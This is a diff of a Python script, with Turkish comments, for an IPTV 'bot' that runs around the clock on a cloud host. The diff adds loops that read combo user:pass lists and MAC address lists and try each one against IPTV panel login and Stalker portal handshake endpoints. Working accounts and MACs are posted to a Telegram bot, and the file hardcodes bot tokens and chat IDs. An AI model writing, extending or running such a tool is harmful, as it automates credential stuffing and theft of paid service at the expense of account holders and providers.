@@ -1,6 +1,7 @@
 import os
 import time
 import threading
+import glob
 import requests
 from flask import Flask
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
@@ -8,44 +9,44 @@ from requests.packages.urllib3.exceptions import InsecureRequestWarning
 # SSL uyarılarını kapat
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
-uygulama = Flask('')
+app = Flask('')
 
-@uygulama.route('/')
-def ana_sayfa():
-    return "IPTV Botu Aktif ve 7/24 Bulutta Çalışıyor!"
+@app.route('/')
+def home():
+    return "IPTV Bot Aktif ve 7/24 Bulutta Çalışıyor!"
 
-def webi_calistir():
-    uygulama.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))
+def run_web():
+    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))
 
 # --- TELEGRAM AYARLARI ---
-TOKEN = "9296501081:AAG8COydawvxX-TfAEArbG-SdEtliP6WODM"
-CHAT_ID = "-1003901042500"
+TOKEN = "9296501081:AAGTNmvWB8Qn8-kVxGNoJcC8LXTLb8lnZ94"
+CHAT_ID = "39743305"
 
 def telegrama_gonder(mesaj):
     try:
         url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
-        veri = {"chat_id": CHAT_ID, "text": mesaj, "parse_mode": "HTML"}
-        requests.post(url, data=veri, timeout=10)
-    except Exception as hata:
-        print(f"[!] Telegram mesajı gönderilemedi: {hata}")
+        data = {"chat_id": CHAT_ID, "text": mesaj, "parse_mode": "HTML"}
+        requests.post(url, data=data, timeout=10)
+    except Exception as e:
+        print(f"[!] Telegram mesajı gönderilemedi: {e}")
 
-def m3u_tara(panel, kullanici, sifre):
-    api_adresi = f"http://{panel}/player_api.php?username={kullanici}&password={sifre}"
-    basliklar = {
+def m3u_tara(panel, user, pas):
+    api_url = f"http://{panel}/player_api.php?username={user}&password={pas}"
+    headers = {
         'Cookie': 'stb_lang=pt; timezone=America%2FNew_York;',
         'User-Agent': 'VLC/3.0.18 LibVLC/3.0.18',
     }
     try:
-        yanit = requests.get(api_adresi, headers=basliklar, timeout=5, verify=False)
-        if yanit.status_code == 200 and 'user_info' in yanit.text:
-            if '"auth":1' in yanit.text or '"status":"Active"' in yanit.text:
-                m3u_linki = f"http://{panel}/get.php?username={kullanici}&password={sifre}&type=m3u_plus"
+        res = requests.get(api_url, headers=headers, timeout=5, verify=False)
+        if res.status_code == 200 and 'user_info' in res.text:
+            if '"auth":1' in res.text or '"status":"Active"' in res.text:
+                m3ulink = f"http://{panel}/get.php?username={user}&password={pas}&type=m3u_plus"
                 mesaj = (
                     f"🔥 <b>M3U HİT BULUNDU! (Bulut)</b>\n"
                     f"🌐 <b>Panel:</b> http://{panel}\n"
-                    f"👤 <b>Kullanıcı:</b> <code>{kullanici}</code>\n"
-                    f"🔑 <b>Şifre:</b> <code>{sifre}</code>\n"
-                    f"🔗 <b>M3U:</b> {m3u_linki}"
+                    f"👤 <b>User:</b> <code>{user}</code>\n"
+                    f"🔑 <b>Pass:</b> <code>{pas}</code>\n"
+                    f"🔗 <b>M3U:</b> {m3ulink}"
                 )
                 telegrama_gonder(mesaj)
                 return True
@@ -53,16 +54,16 @@ def m3u_tara(panel, kullanici, sifre):
         pass
     return False
 
-def mac_tara(panel, mac_adresi):
-    mac_url = f"http://{panel}/c/portal.imixs.com/stalker_portal/server/load.php?type=stb&action=handshake&mac={mac_adresi}"
-    basliklar = {'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3'}
+def mac_tara(panel, mac):
+    mac_url = f"http://{panel}/c/portal.imixs.com/stalker_portal/server/load.php?type=stb&action=handshake&mac={mac}"
+    headers = {'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3'}
     try:
-        yanit = requests.get(mac_url, headers=basliklar, timeout=5, verify=False)
-        if yanit.status_code == 200 and ('js' in yanit.text or 'token' in yanit.text):
+        res = requests.get(mac_url, headers=headers, timeout=5, verify=False)
+        if res.status_code == 200 and ('js' in res.text or 'token' in res.text):
             mesaj = (
                 f"🔥 <b>MAC HİT BULUNDU! (Bulut)</b>\n"
                 f"🌐 <b>Panel:</b> http://{panel}\n"
-                f"📡 <b>MAC:</b> <code>{mac_adresi}</code>"
+                f"💻 <b>MAC:</b> <code>{mac}</code>"
             )
             telegrama_gonder(mesaj)
             return True
@@ -73,28 +74,63 @@ def mac_tara(panel, mac_adresi):
 def arka_plan_tarayici():
     print("[*] Bulut Otonom Tarayıcı Başlatıldı...")
     
-    # Not: Render'da listeleri doğrudan GitHub'daki dosyalardan okutabilir 
-    # veya buraya örnek paneller/combo listeleri ekleyebilirsin.
-    # Örnek test listeleri:
-    paneller = ["ornekpanel.com:8080"] 
-    combolar = []
-    mac_listesi = []
-
     while True:
         try:
-            print("[i] Tarama turu dönüyor...")
-            # Tarama mantığı burada dönecek
-            # GitHub'a yeni liste attığında botun onları çekmesi için raw link kullanılabilir
+            print("[i] Tarama turu başlıyor, klasörler taranıyor...")
             
-            time.sleep(1800) # 30 dk bekleme
-        except Exception as hata:
-            print(f"[!] Hata: {hata}")
+            # 1. Klasörlerdeki tüm dosyaları otomatik bul (Parçalı dosyalar dahil)
+            combo_dosyalari = glob.glob(os.path.join("combo", "*.txt"))
+            mac_dosyalari = glob.glob(os.path.join("mac_list", "*.txt"))
+            panel_dosyalari = glob.glob(os.path.join("panel_list", "*.txt"))
+            
+            # Panelleri oku
+            paneller = []
+            for p_dosya in panel_dosyalari:
+                with open(p_dosya, "r", encoding="utf-8", errors="ignore") as f:
+                    for satir in f:
+                        p = satir.strip()
+                        if p and p not in paneller:
+                            paneller.append(p)
+            
+            # Macleri oku
+            maclar = []
+            for m_dosya in mac_dosyalari:
+                with open(m_dosya, "r", encoding="utf-8", errors="ignore") as f:
+                    for satir in f:
+                        m = satir.strip()
+                        if m and m not in maclar:
+                            maclar.append(m)
+
+            print(f"[i] Toplam {len(paneller)} panel, {len(maclar)} MAC ve {len(combo_dosyalari)} adet combo dosyası yüklendi.")
+
+            # 2. MAC Taraması Örneği
+            for panel in paneller:
+                for mac in maclar:
+                    mac_tara(panel, mac)
+
+            # 3. Combo (Combo: user:pass) Taraması Örneği
+            for combo_dosya in combo_dosyalari:
+                print(f"[i] İşlenen combo dosyası: {os.path.basename(combo_dosya)}")
+                with open(combo_dosya, "r", encoding="utf-8", errors="ignore") as f:
+                    for satir in f:
+                        parca = satir.strip().split(':')
+                        if len(parca) >= 2:
+                            user = parca[0]
+                            pas = parca[1]
+                            for panel in paneller:
+                                m3u_tara(panel, user, pas)
+
+            print("[i] Tarama turu tamamlandı, 30 dakika bekleniyor...")
+            time.sleep(1800)  # 30 dk bekleme
+            
+        except Exception as e:
+            print(f"[!] Hata: {e}")
             time.sleep(60)
 
 if __name__ == '__main__':
-    # Flask sunucusunu ayrı bir iş parçacığında (arkada) çalıştır
-    is_parcasi = threading.Thread(target=webi_calistir)
-    is_parcasi.start()
-    
+    # Flask sunucusunu ayrı bir thread'de (arkada) çalıştır
+    t = threading.Thread(target=run_web)
+    t.start()
+        
     # Tarayıcı döngüsünü başlat
     arka_plan_tarayici()
